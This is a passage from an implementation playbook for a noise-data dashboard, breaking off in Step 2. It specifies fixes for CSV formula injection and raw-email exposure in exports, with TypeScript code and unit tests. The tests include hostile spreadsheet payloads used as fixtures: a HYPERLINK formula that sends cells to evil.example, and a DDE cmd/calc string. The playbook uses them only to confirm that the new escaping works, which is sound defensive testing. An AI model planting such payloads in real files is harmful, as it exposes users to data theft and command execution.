# Playbook 07 — Research Export Integrity & Privacy

Implementation spec for the defect cluster covering the research CSV and JSON export and the analytics table: spreadsheet-formula and column injection from writer-controlled fields (sec-2), the 'User Email' column and CSV column that join a raw `users.email` (or a raw uid) to exact GPS through a whole-collection `users` listing (priv-2), and the missing uncalibrated-dB disclosure on the stats row and in both exports (ux-3).

**Execute steps in order. Each step is exactly one commit. Gate every step on `npx tsc -b` (0 errors), `npx eslint <the files the step changed>` (0 errors, no new warnings; skip deleted files) and `npx vitest run <the test files the step names>`. Run `npm test` and `npm run build` ONCE, at the end of Step 3 (master playbook §1.3).**

All BEFORE blocks below were copied verbatim from the working tree on 2026-10-15 (dashboard HEAD `353bbdd`), with one class of exception that each block marks with "as left by ...". Clusters 04 and 06 edit the same regions of `exportHelpers.ts` and `DataTable.tsx` before this cluster runs, and master §4.7 says 07.1 anchors on that post-04/06 text. Those blocks (every one in Step 1 that touches the row builder, the JSON builder or the imports, and every later block that anchors on this cluster's own AFTER text) are the AFTER text of 04.2, 06.3 and this spec, not HEAD text, so they do NOT match a checkout of `353bbdd`. They were produced by applying the 04, 06 and 07 specs in order to a scratch copy of the tree, and each BEFORE was asserted to occur exactly once in the file it edits at that point. A block marked "lines a-b at HEAD" sits in a region that 04 and 06 do not touch, so it matches both HEAD and the post-04/06 tree; the numbers are HEAD numbers and drift, so match on text only. If a BEFORE block does not match, STOP and re-read the file: do not guess. If the mismatch is a legitimate earlier-cluster edit, apply the step semantically (master §4.7): every CSV cell goes through `csvCell` or `csvFixed`, and no 04 (`getReadingDate`, `getCoordinates`) or 06 (`categoryLabel`, `confidenceOf`, `confidencePercent`) change is lost.

Environment facts (verified):

- Dashboard `package.json`: `date-fns ^4.1.0` (installed 4.1.0), `typescript ~5.9.3` (5.9.3), `react ^19.2.0` (19.2.4), `tailwindcss ^4.2.1` (4.2.1, so `col-span-full` exists). After 01.1 the repo has `vitest` 4.1.11. Node is `v20.20.0`.
- `tsconfig.app.json`: `"strict": false`; `"verbatimModuleSyntax": true` (type-only imports must use `import type`; the `UserInfo` import in `exportHelpers.ts` is type-only and is erased, so a test that imports `exportHelpers` loads no Firebase module); `"erasableSyntaxOnly": true`; `"include": ["src"]`, so test files are type-checked by `tsc -b`.
- `eslint.config.js` extends `tseslint.configs.recommended`, so an unused import or variable is an error. Steps 2 and 3 therefore remove every import they orphan.
- Test layout from 01.1: `vitest.config.ts` uses `environment: 'node'` and `include: ['src/**/*.test.{ts,tsx}']`. Tests import `describe`/`it`/`expect` explicitly (no globals) and live in `__tests__/` beside the module: `src/utils/__tests__/` and `src/lib/__tests__/`. No jsdom is installed, so no component is rendered in a test.
- State this cluster builds on (clusters 04 and 06 are DONE before it starts): `src/lib/readings.ts` exports `getReadingDate(reading): Date | null` and `getCoordinates(reading): { lat; lng } | null` (04.2). `NoiseReading` is the master §4.3 shape (04.3, then 06.3 drops `soundCategory`): `userEmail?: string`, `decibelLevel: number`, `latitude`/`longitude: number`, `soundClass?: string`, `soundType?: 'Pollution' | 'Ambient'`, `confidence?: number`, `timestamp: number | null`. `src/lib/categories.ts` exports `categoryLabel`, `confidenceOf` and `confidencePercent` (06.1). `src/lib/noiseBands.ts` exports `noiseBand(decibels)` returning `{ id: 'low' | 'moderate' | 'high', label, color }` (06.1).
- Callers at HEAD: `exportToCSV` and `exportToJSON` are called only from `src/pages/AnalyticsPage.tsx` (CSV `:121`, JSON `:132`). `userService.ts` is imported by exactly three files: `AnalyticsPage.tsx:13`, `DataTable.tsx:4` and `exportHelpers.ts:2` (a type-only import). `StatsCards` renders on both `/dashboard` (`DashboardPage.tsx:62`) and `/analytics` (`AnalyticsPage.tsx:63`).
- Production ground truth (2026-10-16 probe): 3,374 `noise_readings` docs; `userEmail` is a masked label on 3,372 and missing on 2, with 0 raw-looking values and no `deleted_user_*` docs yet. `users` has 5 docs, exactly one with `role: 'admin'`. Firebase Auth has 7 users, 2 of them with no `users` doc.
- The app's contract (READ ONLY, `noise_pollution_mapper/`): `FirebaseService.authorLabel` (`lib/services/firebase_service.dart:30-37`) returns the Auth display name, else the first three characters of the local part plus `***@domain`, else 'Anonymous'. The online write stores it as `userEmail` (`:165`). The offline sync path falls back to the RAW auth email when the queued label is null (`lib/services/sync_service.dart:308`, finding priv-6, an accepted app-side residual). Account deletion rewrites `userEmail` to 'Deleted User' and `userId` to `deleted_user_<8 chars>` (`settings_screen_enhanced.dart:970-973`). The app's own caveat text is at `lib/screens/dashboard_screen.dart:1015-1016`.
- Line endings: every file edited here is LF in the index and the working tree. Write the new files with LF.

---

## Scope

| ID | Status | One-liner |
|---|---|---|
| sec-2 | UNVERIFIED (Medium, confidence high) | The browser CSV export escapes only quotes in `locationName` (`exportHelpers.ts:66`). `soundCategory`/`soundClass` and `soundType` are interpolated unescaped (`:74-75`), lat/lng are written unquoted (`:71-72`), and a leading `=`, `+`, `-`, `@`, tab or CR is never neutralized. Any registrant can write those fields (rules `create` checks only `userId == auth.uid`), and the file is built for Excel (BOM at `:84-86`). Step 1 adds `csvCell`/`csvFixed`, writes EVERY cell (header included) through them, and splits the file into pure, tested builders. |
| priv-2 | PARTIAL (Medium) | `AnalyticsPage.tsx:26-30` lists the whole `users` collection on every visit (`userService.ts:17-18`). The 'User Email' column (`DataTable.tsx:209`, `:282`) and the CSV column (`exportHelpers.ts:24`, `:77`) then show the RAW `users.email` next to exact lat/lng for the one admin (the owner), and raw 28-character uids under an email header for everyone else (the denied list is swallowed at `userService.ts:28-30`). The masked label every reading already carries (`userEmail`) is never used. Step 2 shows that label as 'Contributor', re-masks any raw address that reaches the cache, and deletes `userService.ts` together with its only consumers. It is a data-minimisation fix, not an access-control one: rules step 02.4 makes `users` owner-read only, and this step removes the only browser code that lists it. Either order of 02.4 and 07.2 is safe. |
| ux-3 | UNVERIFIED (Medium, confidence high) | dB values, 'Avg Noise Level' and 'Peak Noise' are shown as measured fact (`StatsCards.tsx:58-82`), and both exports carry no caveat (`exportHelpers.ts:20`), while the app discloses that its numbers are uncalibrated phone estimates. Step 3 exports one shared `DB_CAVEAT`, shows it under the stats row, and puts it in the CSV dB header and the JSON `metadata.note`. |

Full finding text and verifier evidence: grep the IDs in `audit/00_MASTER_AUDIT_REPORT.md`, `audit/05_SECURITY_AUDIT.md` (sec-2, priv-2) and `audit/02_UI_UX_AUDIT.md` (ux-3).

---

## Pre-reading

Open these files before touching anything:

1. `audit/08_FIX_IMPLEMENTATION_PLAYBOOK.md`: these sections.
   - §2: conventions 2.1 (the only `users` access is the owner's own doc), 2.4 (read-only browser), 2.11 (bands and categories only from `src/lib`), 2.13 (never log a whole reading), 2.15 (tests never touch Firebase).
   - §3.2: the hard dependency 07.3 → 09.4 (the legend reuses `DB_CAVEAT`).
   - §4.7: the final `exportHelpers.ts` and `DataTable.tsx` shape, and the column table this cluster must produce.
   - §4.9: the `AnalyticsPage.tsx` composite (05.4 → 07.2 → 08.1 → 08.2).
   - §4.11: `DB_CAVEAT` is exported from `src/lib/noiseBands.ts`.
   - §5: commits #25-#27.
2. `src/utils/exportHelpers.ts`: the whole file, as left by 04.2 and 06.3 (about 140 lines).
3. `src/components/analytics/DataTable.tsx`: lines 1-45 and 175-290 as left by 04.2 and 06.3.
4. `src/pages/AnalyticsPage.tsx`: the whole file (158 lines at HEAD; 05.4 adds a loading and an error state).
5. `src/services/userService.ts`: the whole file (53 lines).
6. `src/components/analytics/StatsCards.tsx`: the whole file (104 lines).
7. `src/lib/noiseBands.ts` and `src/lib/categories.ts` (both from 06.1), and `src/lib/readings.ts` (04.2), for the helper signatures.
8. `src/lib/__tests__/utils.test.ts` and `vitest.config.ts` (both from 01.1), for the test conventions.
9. READ ONLY, the APP contract: `APP:lib/services/firebase_service.dart:30-37` and `:160-182`, `APP:lib/services/sync_service.dart:300-312`, `APP:lib/screens/dashboard_screen.dart:1008-1020`.

---

## Steps

### Step 1 — sec-2: quote every CSV cell and neutralize formula-leading values

**Goal:** `exportHelpers.ts` has two pure, unit-tested builders, `buildCsv(readings)` and `buildJsonExport(readings, exportedAt)`, and two thin wrappers that download their output. In the CSV, EVERY cell (the header row included, numbers included) is written through `csvCell` or `csvFixed`. A value can no longer end its cell or add a column, and a text value that starts with `=`, `+`, `-`, `@`, tab or CR is written with a leading apostrophe so Excel and Sheets read it as text. A non-finite number can no longer reach `toFixed`. The local `getNoiseLevel` copy is replaced by the shared `noiseBand()`.

**Files:**
- `src/utils/exportHelpers.ts`
- `src/utils/__tests__/exportHelpers.test.ts` (new)

**Exact changes**

1a. `src/utils/exportHelpers.ts`: import the shared dB band.

BEFORE (`src/utils/exportHelpers.ts`, as left by 04.2c and 06.3p, verbatim):
```ts
import { getCoordinates, getReadingDate } from '@/lib/readings';
```

AFTER:
```ts
import { getCoordinates, getReadingDate } from '@/lib/readings';
import { noiseBand } from '@/lib/noiseBands';
```

Placement note: `noiseBand()` replaces the local `getNoiseLevel` in 1d. This is the hand-off 06.1 left for 07.1 (06 Out of scope). `src/lib/noiseBands.ts` exists after 06.1.

1b. `src/utils/exportHelpers.ts`: replace `exportToCSV` with `csvCell`, `csvFixed`, a pure `buildCsv`, and a thin `exportToCSV` wrapper.

BEFORE (`src/utils/exportHelpers.ts`, as left by 04.2d and 06.3q, verbatim):
```ts
/**
 * Export noise readings to CSV format (Excel-compatible)
 */
export function exportToCSV(data: NoiseReading[], userMap?: Map<string, UserInfo>, filename: string = 'noise_readings') {
  if (!data || data.length === 0) {
    console.warn('[exportToCSV] No data to export');
    return;
  }

  // CSV Header
  const headers = [
    'Timestamp',
    'Location',
    'Latitude',
    'Longitude',
    'Noise Level (dB)',
    'Category',
    'Type',
    'Confidence (%)',
    'User Email'
  ];

  // CSV Rows
  const rows = data.map(reading => {
    // Coordinates through the shared helper (flat, finite, in-range only)
    const coords = getCoordinates(reading);
    const lat: number | string = coords ? coords.lat : '';
    const lng: number | string = coords ? coords.lng : '';

    // Format timestamp through the shared helper. Rows come back from
    // IndexedDB without Timestamp methods, so the old `.toDate` check was
    // always false and every row said 'Unknown' (bug-1).
    const timestamp = formatExportTimestamp(reading);

    // Escape quotes in location name
    const locationName = (reading.locationName || '').replace(/"/g, '""');

    return [
      `"${timestamp}"`,
      `"${locationName}"`,
      lat,
      lng,
      reading.decibelLevel.toFixed(1),
      `"${categoryLabel(reading)}"`,
      `"${reading.soundType || 'Unknown'}"`,
      confidencePercent(reading)?.toFixed(2) ?? '',
      `"${userMap?.get(reading.userId)?.email || reading.userId || 'Unknown'}"`
    ].join(',');
  });

  // Combine header and rows
  const csvContent = [headers.join(','), ...rows].join('\n');

  // Add BOM for Excel UTF-8 compatibility
  const BOM = '\uFEFF';
  const csvWithBOM = BOM + csvContent;

  // Download file
  downloadFile(csvWithBOM, `${filename}_${format(new Date(), 'yyyyMMdd_HHmmss')}.csv`, 'text/csv;charset=utf-8;');
}
```

AFTER:
```ts
/**
 * Quote one CSV cell and neutralize spreadsheet formulas (sec-2).
 *
 * Every cell is wrapped in double quotes and embedded quotes are doubled, so a
 * value can never end its cell or add a column. A STRING that starts with
 * `=`, `+`, `-`, `@`, tab or CR gets a leading apostrophe, so Excel and Sheets
 * read it as text instead of evaluating it as a formula. Reading fields such
 * as `locationName` and `soundClass` are writable by any registrant, so every
 * text value is untrusted.
 *
 * A finite NUMBER is written as its plain decimal text with no apostrophe. It
 * can only hold digits, '.', 'e' and a leading '-', so it cannot be a formula,
 * and an apostrophe would turn a negative coordinate into text. NaN and
 * Infinity become an empty cell.
 */
export function csvCell(value: unknown): string {
  if (typeof value === 'number') {
    return quoteCell(Number.isFinite(value) ? String(value) : '');
  }
  let text = String(value ?? '');
  if (/^[=+\-@\t\r]/.test(text)) {
    text = `'${text}`;
  }
  return quoteCell(text);
}

/**
 * A number with a fixed count of decimals as one quoted cell. An empty cell
 * when the value is missing or not finite, so toFixed never sees NaN.
 */
export function csvFixed(value: number | null | undefined, digits: number): string {
  return quoteCell(typeof value === 'number' && Number.isFinite(value) ? value.toFixed(digits) : '');
}

function quoteCell(text: string): string {
  return `"${text.replace(/"/g, '""')}"`;
}

/**
 * Build the CSV text (no BOM): a quoted header row, then one row per reading.
 * A pure function so it can be unit-tested; exportToCSV adds the BOM and
 * downloads it.
 */
export function buildCsv(data: NoiseReading[], userMap?: Map<string, UserInfo>): string {
  // CSV Header
  const headers = [
    'Timestamp',
    'Location',
    'Latitude',
    'Longitude',
    'Noise Level (dB)',
    'Category',
    'Type',
    'Confidence (%)',
    'User Email'
  ];

  // CSV Rows: every cell goes through csvCell / csvFixed
  const rows = data.map(reading => {
    const coords = getCoordinates(reading);
    const date = getReadingDate(reading);

    return [
      csvCell(date ? format(date, 'yyyy-MM-dd HH:mm:ss') : ''),
      csvCell(reading.locationName),
      csvCell(coords ? coords.lat : ''),
      csvCell(coords ? coords.lng : ''),
      csvFixed(reading.decibelLevel, 1),
      csvCell(categoryLabel(reading)),
      csvCell(reading.soundType || 'Unknown'),
      csvFixed(confidencePercent(reading), 2),
      csvCell(userMap?.get(reading.userId)?.email || reading.userId || 'Unknown')
    ].join(',');
  });

  return [headers.map((header) => csvCell(header)).join(','), ...rows].join('\n');
}

/**
 * Export noise readings to CSV format (Excel-compatible)
 */
export function exportToCSV(data: NoiseReading[], userMap?: Map<string, UserInfo>, filename: string = 'noise_readings') {
  if (!data || data.length === 0) {
    console.warn('[exportToCSV] No data to export');
    return;
  }

  // Add BOM for Excel UTF-8 compatibility
  const BOM = '\uFEFF';
  const csvWithBOM = BOM + buildCsv(data, userMap);

  // Download file
  downloadFile(csvWithBOM, `${filename}_${format(new Date(), 'yyyyMMdd_HHmmss')}.csv`, 'text/csv;charset=utf-8;');
}
```

Placement note: this block runs from the doc comment above `exportToCSV` to the closing brace of `exportToCSV`, directly above the `exportToJSON` doc comment. The `UserInfo` import and the `userMap` parameter stay in this step; 07.2 removes them. The `Timestamp` cell now reads `getReadingDate(reading)` directly and is empty (not 'Unknown') when a reading has no date, which is the master §4.7 column contract. The JSON export keeps 'Unknown' through `formatExportTimestamp`.

1c. `src/utils/exportHelpers.ts`: replace `exportToJSON` with a pure `buildJsonExport` and a thin wrapper.

BEFORE (`src/utils/exportHelpers.ts`, as left by 04.2e and 06.3r, verbatim):
```ts
/**
 * Export noise readings to JSON format
 */
export function exportToJSON(data: NoiseReading[], filename: string = 'noise_readings') {
  if (!data || data.length === 0) {
    console.warn('[exportToJSON] No data to export');
    return;
  }

  // Transform data for export
  const exportData = {
    metadata: {
      exportDate: format(new Date(), 'yyyy-MM-dd HH:mm:ss'),
      totalRecords: data.length,
      source: 'Urban Noise Pollution Mapper',
      version: '2.6.0'
    },
    readings: data.map(reading => ({
      id: reading.id,
      timestamp: formatExportTimestamp(reading),
      location: {
        name: reading.locationName || 'Unknown',
        coordinates: extractCoordinates(reading)
      },
      measurement: {
        decibelLevel: reading.decibelLevel,
        noiseLevel: getNoiseLevel(reading.decibelLevel),
        soundCategory: categoryLabel(reading),
        soundType: reading.soundType || 'Unknown',
        confidence: confidenceOf(reading)
      },
      userId: reading.userId || 'Unknown'
    }))
  };

  // Pretty-print JSON
  const jsonContent = JSON.stringify(exportData, null, 2);

  // Download file
  downloadFile(jsonContent, `${filename}_${format(new Date(), 'yyyyMMdd_HHmmss')}.json`, 'application/json');
}
```

AFTER:
```ts
/**
 * Build the JSON export object. A pure function so it can be unit-tested;
 * `exportedAt` is a parameter so a test does not depend on the clock.
 */
export function buildJsonExport(data: NoiseReading[], exportedAt: Date) {
  return {
    metadata: {
      exportDate: format(exportedAt, 'yyyy-MM-dd HH:mm:ss'),
      totalRecords: data.length,
      source: 'Urban Noise Pollution Mapper',
      version: '2.6.0'
    },
    readings: data.map(reading => ({
      id: reading.id,
      timestamp: formatExportTimestamp(reading),
      location: {
        name: reading.locationName || 'Unknown',
        coordinates: extractCoordinates(reading)
      },
      measurement: {
        decibelLevel: reading.decibelLevel,
        noiseLevel: noiseBand(reading.decibelLevel).id,
        soundCategory: categoryLabel(reading),
        soundType: reading.soundType || 'Unknown',
        confidence: confidenceOf(reading)
      },
      userId: reading.userId || 'Unknown'
    }))
  };
}

/**
 * Export noise readings to JSON format
 */
export function exportToJSON(data: NoiseReading[], filename: string = 'noise_readings') {
  if (!data || data.length === 0) {
    console.warn('[exportToJSON] No data to export');
    return;
  }

  // Pretty-print JSON
  const jsonContent = JSON.stringify(buildJsonExport(data, new Date()), null, 2);

  // Download file
  downloadFile(jsonContent, `${filename}_${format(new Date(), 'yyyyMMdd_HHmmss')}.json`, 'application/json');
}
```

Placement note: `noiseLevel` now comes from `noiseBand(...).id`, whose ids are exactly the old `'low' | 'moderate' | 'high'` strings at the same 50 / 70 edges. The `soundCategory` JSON key keeps its name (06.3r).

1d. `src/utils/exportHelpers.ts`: delete the local `getNoiseLevel` (its only caller was the JSON builder replaced in 1c).

BEFORE (`src/utils/exportHelpers.ts`, lines 182-193 at HEAD `353bbdd`, verbatim):
```ts
/**
 * Helper: Determine noise level category
 */
function getNoiseLevel(decibels: number): 'low' | 'moderate' | 'high' {
  if (decibels < 50) return 'low';
  if (decibels <= 70) return 'moderate';
  return 'high';
}

/**
 * Helper: Trigger browser download
 */
```

AFTER:
```ts
/**
 * Helper: Trigger browser download
 */
```

Placement note: this region is not touched by 04 or 06, so the block is verbatim from the working tree. `formatExportTimestamp`, `extractCoordinates` and `downloadFile` stay as they are.

1e. New file `src/utils/__tests__/exportHelpers.test.ts`: unit tests for the pure builders. Imports `exportHelpers` only; no Firebase module is loaded (convention 2.15).

Full contents:
```ts
import { describe, expect, it } from 'vitest';
import type { NoiseReading } from '@/types/NoiseReading';
import { buildCsv, buildJsonExport, csvCell, csvFixed } from '@/utils/exportHelpers';

const HEADERS = [
  'Timestamp',
  'Location',
  'Latitude',
  'Longitude',
  'Noise Level (dB)',
  'Category',
  'Type',
  'Confidence (%)',
  'User Email',
];

// Built from local-time parts: the export formats in local time, so the
// expected text is the same in every time zone.
const CAPTURED_AT = new Date(2026, 0, 15, 10, 30, 0);

const HOSTILE_FORMULA = '=HYPERLINK("https://evil.example/?d="&B2&C2,"Open")';
const HOSTILE_QUOTE = `x","=cmd|' /C calc'!A0`;

function reading(overrides: Partial<NoiseReading> = {}): NoiseReading {
  return {
    id: 'r1',
    userId: 'uid1',
    userEmail: 'ab***@example.com',
    decibelLevel: 65.2,
    latitude: 6.9271,
    longitude: 79.8612,
    locationName: 'Colombo Fort',
    soundClass: 'Traffic',
    soundType: 'Pollution',
    confidence: 0.5,
    timestamp: CAPTURED_AT.getTime(),
    createdAt: null,
    ...overrides,
  };
}

/** Minimal RFC 4180 reader: quotes, doubled quotes, and newlines inside quotes. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let inQuotes = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i];
    if (inQuotes) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else {
          inQuotes = false;
        }
      } else {
        cell += ch;
      }
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ',') {
      row.push(cell);
      cell = '';
    } else if (ch === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
    } else {
      cell += ch;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

describe('csvCell', () => {
  it('wraps a value in double quotes', () => {
    expect(csvCell('abc')).toBe('"abc"');
  });

  it('doubles embedded quotes', () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('prefixes an apostrophe to a formula such as =HYPERLINK', () => {
    expect(csvCell(HOSTILE_FORMULA)).toBe(
      `"'=HYPERLINK(""https://evil.example/?d=""&B2&C2,""Open"")"`,
    );
  });

  it.each(['=', '+', '-', '@', '\t', '\r'])('neutralizes a leading %j', (lead) => {
    expect(csvCell(`${lead}1+1`)).toBe(`"'${lead}1+1"`);
  });

  it('leaves a safe string alone, even with = inside', () => {
    expect(csvCell('a=b')).toBe('"a=b"');
  });

  it('writes null and undefined as an empty cell', () => {
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(null)).toBe('""');
    expect(csvCell('')).toBe('""');
  });

  it('writes a finite number as plain text, so a negative coordinate stays numeric', () => {
    expect(csvCell(6.9271)).toBe('"6.9271"');
    expect(csvCell(-79.8612)).toBe('"-79.8612"');
  });

  it('still neutralizes a numeric-looking STRING with a leading minus', () => {
    expect(csvCell('-79.8612')).toBe(`"'-79.8612"`);
  });

  it('writes NaN and Infinity as an empty cell', () => {
    expect(csvCell(NaN)).toBe('""');
    expect(csvCell(Infinity)).toBe('""');
  });
});

describe('csvFixed', () => {
  it('formats with a fixed number of decimals', () => {
    expect(csvFixed(65.2, 1)).toBe('"65.2"');
    expect(csvFixed(50, 2)).toBe('"50.00"');
    expect(csvFixed(-3.04, 1)).toBe('"-3.0"');
  });

  it('writes a missing or non-finite value as an empty cell', () => {
    expect(csvFixed(null, 1)).toBe('""');
    expect(csvFixed(undefined, 1)).toBe('""');
    expect(csvFixed(NaN, 1)).toBe('""');
  });
});

describe('buildCsv', () => {
  it('writes the header row', () => {
    expect(parseCsv(buildCsv([]))[0]).toEqual(HEADERS);
  });

  it('writes no byte-order mark (exportToCSV adds it)', () => {
    expect(buildCsv([]).charCodeAt(0)).not.toBe(0xfeff);
  });

  it('writes one nine-column row per reading', () => {
    const rows = parseCsv(buildCsv([reading(), reading({ id: 'r2' })]));
    expect(rows).toHaveLength(3);
    for (const row of rows) {
      expect(row).toHaveLength(9);
    }
  });

  it('writes every field of a normal reading', () => {
    const rows = parseCsv(buildCsv([reading()]));
    expect(rows[1]).toEqual([
      '2026-01-15 10:30:00',
      'Colombo Fort',
      '6.9271',
      '79.8612',
      '65.2',
      'Traffic',
      'Pollution',
      '50.00',
      'uid1',
    ]);
  });

  it('neutralizes a formula in locationName and keeps nine columns', () => {
    const rows = parseCsv(buildCsv([reading({ locationName: HOSTILE_FORMULA })]));
    expect(rows[1]).toHaveLength(9);
    expect(rows[1][1]).toBe(`'${HOSTILE_FORMULA}`);
  });

  it('keeps a quote-bearing soundClass inside its own cell', () => {
    const rows = parseCsv(buildCsv([reading({ soundClass: HOSTILE_QUOTE })]));
    expect(rows[1]).toHaveLength(9);
    expect(rows[1][5]).toBe(HOSTILE_QUOTE);
  });

  it('neutralizes a soundClass that starts with a formula character', () => {
    const rows = parseCsv(buildCsv([reading({ soundClass: "=cmd|' /C calc'!A0" })]));
    expect(rows[1][5]).toBe(`'=cmd|' /C calc'!A0`);
  });

  it('neutralizes a leading minus and a leading tab in text columns', () => {
    const minus = parseCsv(buildCsv([reading({ locationName: '-1+1' })]));
    expect(minus[1][1]).toBe("'-1+1");
    const tab = parseCsv(buildCsv([reading({ locationName: '\t=1' })]));
    expect(tab[1][1]).toBe("'\t=1");
  });

  it('keeps a newline inside its quoted cell as one data row', () => {
    const rows = parseCsv(buildCsv([reading({ locationName: 'a\nb' })]));
    expect(rows).toHaveLength(2);
    expect(rows[1][1]).toBe('a\nb');
  });

  it('writes empty cells, not placeholders, for missing values', () => {
    const rows = parseCsv(
      buildCsv([
        reading({
          locationName: '',
          soundClass: undefined,
          confidence: undefined,
          timestamp: null,
        }),
      ]),
    );
    expect(rows[1][0]).toBe('');
    expect(rows[1][1]).toBe('');
    expect(rows[1][5]).toBe('Unclassified');
    expect(rows[1][7]).toBe('');
  });

  it('keeps negative coordinates numeric', () => {
    const rows = parseCsv(buildCsv([reading({ latitude: -33.8688, longitude: -151.2093 })]));
    expect(rows[1][2]).toBe('-33.8688');
    expect(rows[1][3]).toBe('-151.2093');
  });
});

describe('buildJsonExport', () => {
  it('writes the metadata', () => {
    const json = buildJsonExport([reading()], new Date(2026, 5, 1, 8, 0, 0));
    expect(json.metadata.exportDate).toBe('2026-06-01 08:00:00');
    expect(json.metadata.totalRecords).toBe(1);
  });

  it('writes every field of a normal reading', () => {
    const json = buildJsonExport([reading()], new Date());
    expect(json.readings[0]).toMatchObject({
      id: 'r1',
      timestamp: '2026-01-15 10:30:00',
      location: { name: 'Colombo Fort', coordinates: { latitude: 6.9271, longitude: 79.8612 } },
      measurement: {
        decibelLevel: 65.2,
        noiseLevel: 'moderate',
        soundCategory: 'Traffic',
        soundType: 'Pollution',
        confidence: 0.5,
      },
      userId: 'uid1',
    });
  });

  it('uses the shared 50 / 70 dB band edges', () => {
    const levels = [49.9, 50, 70, 70.1].map((decibelLevel) =>
      buildJsonExport([reading({ decibelLevel })], new Date()).readings[0].measurement.noiseLevel,
    );
    expect(levels).toEqual(['low', 'moderate', 'moderate', 'high']);
  });

  it('writes null confidence and Unknown timestamp when absent', () => {
    const json = buildJsonExport([reading({ confidence: undefined, timestamp: null })], new Date());
    expect(json.readings[0].measurement.confidence).toBeNull();
    expect(json.readings[0].timestamp).toBe('Unknown');
  });
});
```

Placement note: the file sits in `src/utils/__tests__/`, the layout 01.1 set for `src/utils`. `import type { UserInfo }` in `exportHelpers.ts` is type-only and erased, so the module graph the test loads is `date-fns`, `@/lib/readings`, `@/lib/categories` and `@/lib/noiseBands`, all pure. Steps 07.2 and 07.3 edit this file by anchoring on this text: the `HEADERS` array, the expected row in 'writes every field of a normal reading', the `exportHelpers` import line, and the line `describe('buildJsonExport', () => {`.

**Edge cases to preserve**
- Numbers are quoted but never apostrophe-prefixed: a negative latitude or longitude (`-33.8688`) must stay numeric. Only a STRING with a leading `-` is neutralized (`csvCell('-79.8612')` returns `"'-79.8612"`). The test pins both.
- The BOM stays in the `exportToCSV` wrapper, not in `buildCsv`, so the pure builder can be tested and parsed without it. `downloadFile` and its `console.log` of the file NAME only are unchanged.
- The header row goes through `csvCell` too. Step 3 adds a comma to one header, and it must stay a single quoted cell.
- A reading with no date writes an EMPTY `Timestamp` cell in the CSV (not 'Unknown'); the JSON export still says 'Unknown' (`formatExportTimestamp`). A reading with no `soundClass` writes 'Unclassified' (`categoryLabel`, 06.1); an absent confidence is an empty cell and `0` is a real `0.00`. The `Type` cell keeps its 'Unknown' fallback (`soundType` is outside this cluster).
- `toFixed(1)` for dB and `toFixed(2)` for confidence keep their formats for every finite value. The row separator stays `\n`; a newline inside a text value stays inside its quotes and does not start a new row.
- The JSON keys and shape do not change in this step (`soundCategory` stays the key, `userId` stays). `noiseLevel` keeps the strings `'low'`, `'moderate'` and `'high'` at the same 50 / 70 edges.
- `exportToCSV(data, userMap?, filename)` keeps its signature in this step. `UserInfo` and the `userMap` lookup are removed in Step 2.
- No export function reads or logs a whole reading, and nothing here writes to Firestore (conventions 2.4 and 2.13).

**Acceptance criteria**
- `src/utils/__tests__/exportHelpers.test.ts` exists with the contents above and `npx vitest run src/utils/__tests__/exportHelpers.test.ts` reports 31 passing tests (the six leading-character cases count one each) and 0 failing. They cover: `=HYPERLINK(...)` in `locationName`; a quote-bearing `soundClass` (`x","=cmd|' /C calc'!A0`) that stays in its own cell and keeps the row at nine columns; a leading `-`; a leading tab; an empty value; a newline inside a cell; and a negative coordinate that stays numeric.
- `grep -n "toFixed" src/utils/exportHelpers.ts` prints only the line inside `csvFixed`.
- `grep -n 'replace(/"/g' src/utils/exportHelpers.ts` prints only the line inside `quoteCell`.
- `grep -n "getNoiseLevel" src/utils/exportHelpers.ts` prints nothing.
- On `/analytics`, after Export CSV: the saved file opens in a text editor with every field, the header row included, wrapped in double quotes, and the first bytes are the BOM. Opened in Excel or LibreOffice, the Latitude, Longitude, Noise Level and Confidence columns are numbers (right-aligned), not text. A hostile reading cannot be written from the read-only dashboard, so the injection behaviour is pinned by the unit tests only.
- `exportToJSON` still downloads a file with the same keys and values as before, and `noiseLevel` still reads `low`, `moderate` or `high`.

**Verify**
```
npx tsc -b
npx eslint src/utils/exportHelpers.ts src/utils/__tests__/exportHelpers.test.ts
npx vitest run src/utils/__tests__/exportHelpers.test.ts
git status --short
```
Manual: the CSV and JSON checks above. `git status --short` must list exactly `src/utils/exportHelpers.ts` (modified) and `src/utils/__tests__/exportHelpers.test.ts` (new). The untracked `DEPLOYMENT_GUIDE.md`, `SESSION_39_SUMMARY.md` and `audit/` must NOT be staged: stage by explicit path, never `git add -A`. Do NOT run `npm run build` in this step.

**Commit title:** `fix(export): quote every CSV cell and neutralize formula-leading values (sec-2)`

---

### Step 2 — priv-2: show the masked contributor label; stop listing the users collection

**Goal:** The Analytics table and both exports show each reading's masked author label (`reading.userEmail`) under the heading 'Contributor'. A new `authorLabel()` returns the stored label, re-masks anything that still looks like a raw address, passes 'Deleted User' through, and returns 'Anonymous' when the label is missing. `AnalyticsPage` no longer fetches `users`, the `userMap` prop and parameter are gone, and `src/services/userService.ts` is deleted. After this step no code under `src/` lists or reads another user's profile, and nothing in the table or either export can show a raw email or a raw uid as a person's name.

**Files:**
- `src/lib/authorLabel.ts` (new)
- `src/lib/__tests__/authorLabel.test.ts` (new)
- `src/utils/exportHelpers.ts`
- `src/utils/__tests__/exportHelpers.test.ts`
- `src/components/analytics/DataTable.tsx`
- `src/pages/AnalyticsPage.tsx`
- `src/services/userService.ts` (deleted)

**Exact changes**

Prerequisite: Step 1 is committed, and cluster 04.3 is applied (`NoiseReading.userEmail?: string` exists). Every `exportHelpers.ts` and `exportHelpers.test.ts` block below anchors on Step 1's AFTER text.

2a. New file `src/lib/authorLabel.ts`: the contributor label helper.

Full contents:
```ts
/**
 * Contributor label for a reading (priv-2).
 *
 * The Flutter app writes a privacy-safe author label into every
 * `noise_readings.userEmail` (APP `FirebaseService.authorLabel`,
 * `lib/services/firebase_service.dart:30-37`): the Auth display name, or a
 * masked address like `abc***@domain.com`, or 'Anonymous', or 'Deleted User'
 * after account deletion. The dashboard shows that label and never looks up
 * `users/{uid}.email`, which holds the raw address.
 *
